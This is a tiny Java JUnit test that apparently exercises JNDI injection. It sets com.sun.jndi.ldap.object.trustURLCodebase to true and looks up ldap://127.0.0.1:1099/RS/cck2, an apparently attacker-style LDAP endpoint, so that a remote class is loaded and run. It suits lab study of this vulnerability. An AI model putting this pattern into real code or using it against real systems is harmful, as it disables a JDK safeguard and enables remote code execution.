package jdni;

import org.junit.Test;

import javax.naming.InitialContext;

public class JNDITest {
    @Test
    public void testJNDI() throws Exception {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        new InitialContext().lookup("ldap://127.0.0.1:1099/RS/cck2");
    }
}
